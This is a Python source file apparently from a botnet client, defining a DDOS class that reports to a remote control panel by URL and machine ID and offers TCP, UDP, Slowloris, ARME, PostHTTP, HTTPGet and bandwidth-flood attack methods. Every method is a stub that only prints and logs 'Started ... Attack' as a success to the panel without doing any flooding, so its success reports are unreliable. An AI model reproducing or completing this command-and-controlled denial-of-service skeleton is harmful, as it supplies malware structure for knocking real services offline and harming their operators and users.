from HTTPSocket import HTTPSocket

class DDOS:
    def __init__(self, panelURL, machineID):
        self.panelURL = panelURL
        self.C = HTTPSocket(str(self.panelURL), str(machineID))   # Initiate HTTPSocket Class

    def TCP_attack(self, target_host, thread_number, max_timeout_number):
        try:
            print("[*] Started TCP Attack")
            self.C.Log("Succ", "Started TCP Attack")
            self.C.Send("CleanCommands")            
        except Exception as e:
            print("[Error In DDOS, TCP_attack() Function]")
            print(f"[Error] : {e}")
            self.C.Send("CleanCommands")               
            self.C.Log("Fail", "An unexpected error occurred : " + str(e))  

    def UDP_attack(self, target_host, thread_number, max_timeout_number):
        try:
            print("[*] Started UDP Attack")
            self.C.Log("Succ", "Started UDP Attack")
            self.C.Send("CleanCommands")            
        except Exception as e:
            print("[Error In DDOS, UDP_attack() Function]")
            print(f"[Error] : {e}")
            self.C.Send("CleanCommands")
            self.C.Log("Fail", "An unexpected error occurred : " + str(e)) 
            
    def Slowloris_attack(self, target_host, thread_number, max_timeout_number):
        try:
            print("[*] Started Slowloris Attack")
            self.C.Log("Succ", "Started Slowloris Attack")
            self.C.Send("CleanCommands")            
        except Exception as e:
            print("[Error In DDOS, Slowloris_attack() Function]")
            print(f"[Error] : {e}")
            self.C.Send("CleanCommands")
            self.C.Log("Fail", "An unexpected error occurred : " + str(e))  
            
    def ARME_attack(self, target_host, thread_number, max_timeout_number):
        try:
            print("[*] Started ARME Attack")
            self.C.Log("Succ", "Started ARME Attack")
            self.C.Send("CleanCommands")            
        except Exception as e:
            print("[Error In DDOS, ARME_attack() Function]")
            print(f"[Error] : {e}")
            self.C.Send("CleanCommands")
            self.C.Log("Fail", "An unexpected error occurred : " + str(e))  

    def PostHTTP_attack(self, target_host, thread_number, max_timeout_number):
        try:
            print("[*] Started PostHTTP Attack")
            self.C.Log("Succ", "Started PostHTTP Attack")
            self.C.Send("CleanCommands")            
        except Exception as e:
            print("[Error In DDOS, PostHTTP_attack() Function]")
            print(f"[Error] : {e}")
            self.C.Send("CleanCommands")
            self.C.Log("Fail", "An unexpected error occurred : " + str(e)) 
            
    def HTTPGet_attack(self, target_host, thread_number, max_timeout_number):
        try:
            print("[*] Started HTTPGet Attack")
            self.C.Log("Succ", "Started HTTPGet Attack")
            self.C.Send("CleanCommands")            
        except Exception as e:
            print("[Error In DDOS, HTTPGet_attack() Function]")
            print(f"[Error] : {e}")
            self.C.Send("CleanCommands")
            self.C.Log("Fail", "An unexpected error occurred : " + str(e))     

    def BandwidthFlood_attack(self, target_host, thread_number, max_timeout_number):
        try:
            print("[*] Started BandwidthFlood Attack")
            self.C.Log("Succ", "Started BandwidthFlood Attack")
            self.C.Send("CleanCommands")            
        except Exception as e:
            print("[Error In DDOS, BandwidthFlood_attack() Function]")
            print(f"[Error] : {e}")
            self.C.Send("CleanCommands")
            self.C.Log("Fail", "An unexpected error occurred : " + str(e))            